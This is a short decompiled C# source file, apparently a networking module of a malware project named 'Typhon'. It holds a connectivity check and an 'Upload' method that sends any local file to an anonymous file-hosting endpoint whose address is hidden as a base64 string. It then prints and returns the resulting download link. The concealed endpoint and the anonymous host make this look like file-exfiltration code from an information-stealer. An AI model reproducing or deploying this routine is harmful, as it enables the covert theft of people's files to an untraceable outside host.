using System;
using System.Net;
using System.Text;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x02000041 RID: 65
	internal class Networking
	{
		// Token: 0x06000125 RID: 293 RVA: 0x00009A08 File Offset: 0x00007C08
		public static void EnableSSL()
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00009A24 File Offset: 0x00007C24
		public static bool IsConnected()
		{
			bool result;
			try
			{
				new WebClient().DownloadString("https://google.com");
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00009A5C File Offset: 0x00007C5C
		public static string Upload(string file, bool api = false)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					byte[] bytes = webClient.UploadFile(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkuYW5vbmZpbGVzLmNvbS91cGxvYWQ=")), file);
					string @string = Encoding.ASCII.GetString(bytes);
					if (!@string.Contains("\"error\": {"))
					{
						Console.WriteLine(@string.Split(new char[]
						{
							'"'
						})[15]);
						return @string.Split(new char[]
						{
							'"'
						})[15];
					}
					Console.WriteLine(@string);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}
	}
}
